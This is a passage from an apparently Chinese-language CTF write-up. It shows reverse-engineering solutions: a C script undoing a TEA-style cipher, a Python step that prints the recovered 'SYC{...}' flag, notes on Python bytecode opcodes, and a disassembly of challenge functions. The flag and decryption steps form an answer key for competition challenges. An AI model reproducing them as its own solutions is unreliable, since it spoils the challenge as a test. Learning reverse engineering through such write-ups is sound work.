<li>由于java是强类型语言，与C语言一样都是强类型语言，而Python是弱类型语言，在使用Python编写脚本的过程中会出现问题，所以这种加密我使用C语言写解密脚本</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tea_decrpy</span><span class="params">(<span class="type">int</span>* a,<span class="type">int</span>* key)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">71</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">75</span>&#125;;</span><br><span class="line">        <span class="type">int</span> a[<span class="number">60</span>] = &#123;<span class="number">4059137714</span>, <span class="number">1519830914</span>, <span class="number">3871750667</span>, <span class="number">1890982748</span>, <span class="number">3983276104</span>, <span class="number">2305822059</span>, <span class="number">154671964</span>, <span class="number">3408864506</span>, <span class="number">2982649465</span>, <span class="number">1837247900</span>, <span class="number">3703922550</span>, <span class="number">259526261</span>, <span class="number">224773295</span>, <span class="number">3096478889</span>, <span class="number">3917005698</span>, <span class="number">2056116240</span>, <span class="number">2448592371</span>, <span class="number">2823666378</span>, <span class="number">3034013557</span>, <span class="number">4053465317</span>, <span class="number">3104801020</span>, <span class="number">4228949443</span>, <span class="number">3523639803</span>, <span class="number">734475464</span>, <span class="number">3434290322</span>, <span class="number">449129171</span>, <span class="number">3891864247</span>, <span class="number">774166819</span>, <span class="number">4216121845</span>, <span class="number">893954533</span>, <span class="number">1911276122</span>, <span class="number">3745023534</span>, <span class="number">268800390</span>, <span class="number">846530886</span>, <span class="number">1037358412</span>, <span class="number">2421865526</span>, <span class="number">3261944594</span>, <span class="number">3536667328</span>, <span class="number">1999477221</span>, <span class="number">215270502</span>, <span class="number">1546746070</span>, <span class="number">981466737</span>, <span class="number">2913096128</span>, <span class="number">1884720474</span>, <span class="number">1469629074</span>, <span class="number">515962876</span>, <span class="number">988403777</span>, <span class="number">2220914217</span>, <span class="number">818571821</span>, <span class="number">3438236114</span>, <span class="number">2712143956</span>, <span class="number">2444294189</span>, <span class="number">1751950151</span>, <span class="number">1959079183</span>, <span class="number">254166175</span>, <span class="number">3264034348</span>, <span class="number">2264084763</span>, <span class="number">2329694129</span>, <span class="number">2756279860</span>, <span class="number">3773862237</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">59</span>; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                Tea_decrpy(&amp;a[i],key);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">59</span>;i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,a[i]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tea_decrpy</span><span class="params">(<span class="type">int</span>* a,<span class="type">int</span>* key)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i3 = (<span class="number">-1640531527</span>)*<span class="number">32</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i4=<span class="number">31</span>;i4&gt;=<span class="number">0</span>;i4--)</span><br><span class="line">        &#123;</span><br><span class="line">            a[<span class="number">1</span>] -= ((((a[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>)^(a[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>))+a[<span class="number">0</span>])^(key[(i3&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span>]+i3))^(i3+i4);</span><br><span class="line">            i3 += <span class="number">1640531527</span>;</span><br><span class="line">            a[<span class="number">0</span>] -= ((((a[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>)^(a[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>)) + a[<span class="number">1</span>]) ^ (key[i3&amp;<span class="number">3</span>]+i3))^(i3+i4);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//得到结果83,89,67,123,103,48,111,100,95,106,48,98,95,119,119,101,76,67,111,77,101,84,111,111,111,83,83,83,121,67,95,122,122,95,49,95,101,116,51,115,116,97,114,116,95,121,111,85,114,95,106,48,117,114,110,101,121,33,33,125</span></span><br></pre></td></tr></table></figure>
<ul>
<li>然后Python转字符串</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m =[<span class="number">83</span>,<span class="number">89</span>,<span class="number">67</span>,<span class="number">123</span>,<span class="number">103</span>,<span class="number">48</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">106</span>,<span class="number">48</span>,<span class="number">98</span>,<span class="number">95</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">101</span>,<span class="number">76</span>,<span class="number">67</span>,<span class="number">111</span>,<span class="number">77</span>,<span class="number">101</span>,<span class="number">84</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">121</span>,<span class="number">67</span>,<span class="number">95</span>,<span class="number">122</span>,<span class="number">122</span>,<span class="number">95</span>,<span class="number">49</span>,<span class="number">95</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">51</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">85</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">106</span>,<span class="number">48</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">121</span>,<span class="number">33</span>,<span class="number">33</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># SYC&#123;g0od_j0b_wweLCoMeToooSSSyC_zz_1_et3start_yoUr_j0urney!!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="好像是python"><a class="markdownIt-Anchor" href="#好像是python"></a> 好像是python？</h2>
<ul>
<li>这里积累一下Python字节码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">LOAD_CONST</span><br><span class="line">功能：将常量（如字符串、数字）加载到栈上。</span><br><span class="line">示例：LOAD_CONST 0 (&#x27;Hello, World!&#x27;)</span><br><span class="line"></span><br><span class="line">LOAD_NAME</span><br><span class="line">功能：加载一个变量（如全局变量或局部变量）到栈上。</span><br><span class="line">示例：LOAD_NAME 0 (my_variable)</span><br><span class="line"></span><br><span class="line">STORE_NAME</span><br><span class="line">功能：将栈顶的值存储到指定的变量中。</span><br><span class="line">示例：STORE_NAME 0 (my_variable)</span><br><span class="line"></span><br><span class="line">LOAD_FAST</span><br><span class="line">功能：加载局部变量到栈上。</span><br><span class="line">示例：LOAD_FAST 0 (x)</span><br><span class="line"></span><br><span class="line">STORE_FAST</span><br><span class="line">功能：将栈顶的值存储到局部变量。</span><br><span class="line">示例：STORE_FAST 0 (x)</span><br><span class="line"></span><br><span class="line">CALL_FUNCTION</span><br><span class="line">功能：调用一个函数，并将栈上的参数传递给它。</span><br><span class="line">示例：CALL_FUNCTION 2（调用函数并传递两个参数）</span><br><span class="line"></span><br><span class="line">RETURN_VALUE</span><br><span class="line">功能：从函数中返回一个值。</span><br><span class="line">示例：RETURN_VALUE</span><br><span class="line"></span><br><span class="line">POP_TOP</span><br><span class="line">功能：弹出栈顶的值，通常用于丢弃不再需要的值。</span><br><span class="line">示例：POP_TOP</span><br><span class="line"></span><br><span class="line">BINARY_ADD</span><br><span class="line">功能：执行加法运算（通常是两个栈顶值相加）。</span><br><span class="line">示例：BINARY_ADD</span><br><span class="line"></span><br><span class="line">BINARY_MULTIPLY</span><br><span class="line">功能：执行乘法运算。</span><br><span class="line">示例：BINARY_MULTIPLY</span><br><span class="line"></span><br><span class="line">BINARY_SUBTRACT</span><br><span class="line">功能：执行减法运算。</span><br><span class="line">示例：BINARY_SUBTRACT</span><br><span class="line"></span><br><span class="line">BINARY_DIVIDE</span><br><span class="line">功能：执行除法运算。</span><br><span class="line">示例：BINARY_DIVIDE</span><br><span class="line">注意：在执行除法和乘法运算中，栈顶作减数，次栈顶作被减数</span><br><span class="line"></span><br><span class="line">BINARY_XOR</span><br><span class="line">功能：执行按位异或运算。</span><br><span class="line">示例：BINARY_XOR</span><br><span class="line"></span><br><span class="line">BINARY_SUBSCR </span><br><span class="line">指令用于执行从容器（如列表、元组、字典或字符串）中取出一个元素的操作。它的作用是根据索引（或键）从一个</span><br><span class="line"></span><br><span class="line">COMPARE_OP</span><br><span class="line">比较的右边是栈顶元素，比较的左边是栈底元素</span><br><span class="line">功能：进行比较操作，如 ==, !=, &lt;, &gt;, &lt;=, &gt;=。</span><br><span class="line">示例：COMPARE_OP 0 (==)</span><br><span class="line"></span><br><span class="line">JUMP_ABSOLUTE</span><br><span class="line">功能：无条件跳转到指定的字节码位置。</span><br><span class="line">示例：JUMP_ABSOLUTE 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JUMP_ABSOLUTE</span><br><span class="line">功能：无条件跳转到指定的字节码位置。</span><br><span class="line">示例：JUMP_ABSOLUTE 10</span><br><span class="line"></span><br><span class="line">POP_JUMP_IF_FALSE</span><br><span class="line">功能：如果栈顶值为假，则跳转到指定位置。</span><br><span class="line">示例：POP_JUMP_IF_FALSE 20</span><br><span class="line"></span><br><span class="line">FOR_ITER</span><br><span class="line">功能：迭代一个可迭代对象，通常在 for 循环中使用。</span><br><span class="line">示例：FOR_ITER 10 (to 20)</span><br><span class="line">可用于for i in 这个语句</span><br><span class="line">a = [1,2,3,4]</span><br><span class="line">例如：for i in range</span><br><span class="line">	 for i in a</span><br><span class="line">	 等等这些语句</span><br><span class="line">	 </span><br><span class="line">GET_ITER</span><br><span class="line">功能：获取可迭代对象的迭代器。</span><br><span class="line">示例：GET_ITER</span><br><span class="line"></span><br><span class="line">BUILD_LIST</span><br><span class="line">功能：创建一个新列表。</span><br><span class="line">示例：BUILD_LIST 0</span><br><span class="line"></span><br><span class="line">BUILD_DICT</span><br><span class="line">功能：创建一个新字典。</span><br><span class="line">示例：BUILD_DICT 0</span><br><span class="line"></span><br><span class="line">LOAD_GLOBAL：加载全局变量。</span><br><span class="line">STORE_GLOBAL：存储全局变量。</span><br><span class="line">LOAD_ATTR：加载对象的属性。</span><br><span class="line">STORE_ATTR：存储对象的属性。</span><br><span class="line">LOAD_METHOD：加载方法。</span><br><span class="line">CALL_METHOD：调用方法。</span><br><span class="line"></span><br><span class="line">UNARY_INVERT </span><br><span class="line">指令用于对栈顶的整数值进行按位取反（bitwise NOT）操作。具体来说，它会将栈顶的整数值 x 转换为 ~x，即将每一位的值取反。</span><br><span class="line"></span><br><span class="line">DUP_TOP</span><br><span class="line">DUP_TOP 指令用于复制栈顶的元素并将其压入栈中。具体来说，它的行为是将栈顶元素（即最后压入栈的元素）复制一份，并将这两个相同的元素留在栈上。</span><br><span class="line"></span><br><span class="line">ROT_THREE</span><br><span class="line">ROT_THREE 指令用于旋转栈顶的三个元素，使得原本在栈顶的三个元素的位置发生变化。具体而言，它将栈顶的三个元素的顺序改变，使得原栈顶的第三个元素变为新的栈顶。</span><br><span class="line">Stack:</span><br><span class="line">[a]  # 栈顶元素</span><br><span class="line">[b]  # 次顶元素</span><br><span class="line">[c]  # 三顶元素</span><br><span class="line"></span><br><span class="line">ROT_THREE后</span><br><span class="line"></span><br><span class="line">Stack:</span><br><span class="line">[b]  # 新栈顶元素是 b</span><br><span class="line">[c]  # 次顶元素</span><br><span class="line">[a]  # 三顶元素</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>Python逆向，直接看Python字节码，直接给字节码而不是给<code>pyc</code>或者<code>exe</code>文件，反编译不了，但是可以AI一把梭，可是这样学不到什么，所以直接逆（最近在摆脱对AI的依赖）。使用<code>010Editor</code>打开，直接看字节码逆向</p>
</li>
<li>
<p>第一部分内容如下：</p>
</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104185341742.png" alt="image-20241104185341742"></p>
<ul>
<li>大概意思就是：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = &#x27;SYC&#123;MD5(input)&#125;&#x27;</span><br><span class="line">print(&#x27;Please input:&#x27;)</span><br><span class="line">input0 = &#x27;&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来，要求用户输入，然后定义两个函数，<code>test</code>和<code>test1</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104190209875.png" alt="image-20241104190209875"></p>
<ul>
<li>定义的test2和test函数在这边</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of &lt;code <span class="built_in">object</span> test2 at <span class="number">0x00000245D4F44B30</span>, file <span class="string">&quot;program.py&quot;</span>, line <span class="number">6</span>&gt;:</span><br><span class="line">  <span class="number">7</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;SYC&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">1</span> (key)</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>           <span class="number">4</span> LOAD_CONST               <span class="number">2</span> (<span class="number">18</span>)</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">2</span> (length)</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>           <span class="number">8</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">             <span class="number">10</span> STORE_FAST               <span class="number">3</span> (cipher)</span><br><span class="line"></span><br><span class="line"> <span class="number">10</span>          <span class="number">12</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">range</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_FAST                <span class="number">2</span> (length)</span><br><span class="line">             <span class="number">16</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">18</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">20</span> FOR_ITER                <span class="number">48</span> (to <span class="number">70</span>)</span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">4</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">11</span>          <span class="number">24</span> LOAD_FAST                <span class="number">3</span> (cipher)</span><br><span class="line">             <span class="number">26</span> LOAD_METHOD              <span class="number">1</span> (append)</span><br><span class="line">             <span class="number">28</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">             <span class="number">30</span> LOAD_FAST                <span class="number">0</span> (s2)</span><br><span class="line">             <span class="number">32</span> LOAD_FAST                <span class="number">4</span> (i)</span><br><span class="line">             <span class="number">34</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">36</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">38</span> LOAD_FAST                <span class="number">4</span> (i)</span><br><span class="line">             <span class="number">40</span> BINARY_XOR</span><br><span class="line">             <span class="number">42</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">             <span class="number">44</span> LOAD_FAST                <span class="number">1</span> (key)</span><br><span class="line">             <span class="number">46</span> LOAD_FAST                <span class="number">4</span> (i)</span><br><span class="line">             <span class="number">48</span> LOAD_CONST               <span class="number">3</span> (<span class="number">3</span>)</span><br><span class="line">             <span class="number">50</span> BINARY_MODULO</span><br><span class="line">             <span class="number">52</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">54</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">56</span> UNARY_INVERT</span><br><span class="line">             <span class="number">58</span> LOAD_CONST               <span class="number">4</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">60</span> BINARY_ADD</span><br><span class="line">             <span class="number">62</span> BINARY_ADD</span><br><span class="line">             <span class="number">64</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">             <span class="number">66</span> POP_TOP</span><br><span class="line">             <span class="number">68</span> JUMP_ABSOLUTE           <span class="number">20</span></span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>     &gt;&gt;   <span class="number">70</span> LOAD_FAST                <span class="number">3</span> (cipher)</span><br><span class="line">             <span class="number">72</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code <span class="built_in">object</span> test at <span class="number">0x00000245D4F44BE0</span>, file <span class="string">&quot;program.py&quot;</span>, line <span class="number">14</span>&gt;:</span><br><span class="line"> <span class="number">15</span>           <span class="number">0</span> BUILD_LIST               <span class="number">0</span></span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">2</span> (result)</span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>           <span class="number">4</span> LOAD_FAST                <span class="number">0</span> (s)</span><br><span class="line">              <span class="number">6</span> GET_ITER</span><br><span class="line">        &gt;&gt;    <span class="number">8</span> FOR_ITER               <span class="number">218</span> (to <span class="number">228</span>)</span><br><span class="line">             <span class="number">10</span> STORE_FAST               <span class="number">3</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">17</span>          <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">16</span> DUP_TOP</span><br><span class="line">             <span class="number">18</span> ROT_THREE</span><br><span class="line">             <span class="number">20</span> COMPARE_OP               <span class="number">1</span> (&lt;=)</span><br><span class="line">             <span class="number">22</span> POP_JUMP_IF_FALSE       <span class="number">32</span></span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">             <span class="number">26</span> COMPARE_OP               <span class="number">1</span> (&lt;=)</span><br><span class="line">             <span class="number">28</span> POP_JUMP_IF_FALSE       <span class="number">80</span></span><br><span class="line">             <span class="number">30</span> JUMP_FORWARD             <span class="number">4</span> (to <span class="number">36</span>)</span><br><span class="line">        &gt;&gt;   <span class="number">32</span> POP_TOP</span><br><span class="line">             <span class="number">34</span> JUMP_FORWARD            <span class="number">44</span> (to <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">18</span>     &gt;&gt;   <span class="number">36</span> LOAD_FAST                <span class="number">2</span> (result)</span><br><span class="line">             <span class="number">38</span> LOAD_METHOD              <span class="number">0</span> (append)</span><br><span class="line">             <span class="number">40</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">chr</span>)</span><br><span class="line">             <span class="number">42</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">             <span class="number">44</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">46</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">48</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">             <span class="number">52</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">54</span> BINARY_SUBTRACT</span><br><span class="line">             <span class="number">56</span> LOAD_FAST                <span class="number">1</span> (R)</span><br><span class="line">             <span class="number">58</span> BINARY_ADD</span><br><span class="line">             <span class="number">60</span> LOAD_CONST               <span class="number">3</span> (<span class="number">26</span>)</span><br><span class="line">             <span class="number">62</span> BINARY_MODULO</span><br><span class="line">             <span class="number">64</span> LOAD_GLOBAL              <span class="number">2</span> (<span class="built_in">ord</span>)</span><br><span class="line">             <span class="number">66</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">             <span class="number">68</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">70</span> BINARY_ADD</span><br><span class="line">             <span class="number">72</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">74</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">             <span class="number">76</span> POP_TOP</span><br><span class="line">             <span class="number">78</span> JUMP_ABSOLUTE            <span class="number">8</span></span><br><span class="line"></span><br><span class="line"> <span class="number">19</span>     &gt;&gt;   <span class="number">80</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">             <span class="number">82</span> LOAD_FAST                <span class="number">3</span> (i)</span><br><span class="line">             <span class="number">84</span> DUP_TOP</span><br><span class="line">             <span class="number">86</span> ROT_THREE</span><br><span class="line">             <span class="number">88</span> COMPARE_OP               <span class="number">1</span> (&lt;=)</span><br><span class="line">             <span class="number">90</span> POP_JUMP_IF_FALSE      <span class="number">100</span></span><br><span class="line">             <span class="number">92</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">             <span class="number">94</span> COMPARE_OP               <span class="number">1</span> (&lt;=)</span><br><span class="line">             <span class="number">96</span> POP_JUMP_IF_FALSE      <span class="number">148</span></span><br><span class="line">             <span class="number">98</span> JUMP_FORWARD             <span class="number">4</span> (to <span class="number">104</span>)</span><br><span class="line">        &gt;&gt;  <span class="number">100</span> POP_TOP</span><br><span class="line">            <span class="number">102</span> JUMP_FORWARD            <span class="number">44</span> (to <span class="number">148</span>)</span><br><span class="line"></span><br><span class="line"> <span class="number">20</span>     &gt;&gt;  <span class="number">104</span> LOAD_FAST                <span class="number">2</span> (result)</span><br><span class="line">            <span class="number">106</span> LOAD_METHOD              <span class="number">0</span> (append)</span><br><span class="line">            <span class="number">108</span> LOAD_GLOBAL              <span class="number">1</span> (<span class="built_in">chr</span>)</span><br><span 